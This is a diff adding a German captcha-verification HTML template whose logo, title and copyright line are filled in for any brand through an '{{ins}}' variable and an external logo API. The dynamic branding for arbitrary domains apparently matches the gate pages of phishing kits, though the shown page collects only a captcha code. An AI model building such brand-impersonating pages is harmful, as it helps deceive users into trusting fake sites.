@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Captcha-Verifizierung – {{ins}}</title>
+
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      background: #f6f6f6;
+      color: #333;
+    }
+
+    .container {
+      max-width: 430px;
+      margin: 10vh auto;
+      background: #ffffff;
+      padding: 35px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 60px;
+      height: 60px;
+      border-radius: 6px;
+      object-fit: contain;
+    }
+
+    .logo h1 {
+      font-size: 22px;
+      margin-top: 12px;
+      font-weight: 600;
+      color: #E20074;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .captcha-img {
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      padding: 8px;
+      background: #fafafa;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #555;
+    }
+
+    input[type="text"] {
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: 1px solid #bbb;
+      outline: none;
+      background: #fff;
+    }
+
+    input[type="text"]:focus {
+      border-color: #E20074;
+      box-shadow: 0 0 4px rgba(226, 0, 116, 0.4);
+    }
+
+    button {
+      background: #E20074;
+      border: none;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      padding: 13px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    button:hover {
+      background: #c10063;
+    }
+
+    .error {
+      color: #c80032;
+      text-align: center;
+      font-size: 14px;
+      margin-top: -6px;
+    }
+
+    .note {
+      margin-top: 25px;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <div class="logo">
+      <img src="https://api.kickfire.com/logo?website={{ins}}" alt="{{ins}} Logo">
+      <h1>Captcha-Verifizierung</h1>
+    </div>
+
+    <form method="POST" action="/">
+      <img class="captcha-img" src="data:image/png;base64,{{ captcha_image }}" alt="Captcha Code">
+
+      <label for="code">Bitte geben Sie die Zeichen ein:</label>
+      <input type="text" id="code" name="code" placeholder="Code eingeben" required autocomplete="off">
+
+      <button type="submit">Bestätigen</button>
+
+      {% if error %}
+        <div class="error">{{ message }}</div>
+      {% endif %}
+    </form>
+
+    <div class="note">
+      &copy; {{ins}} – Alle Rechte vorbehalten.
+    </div>
+
+  </div>
+
+</body>
+</html>
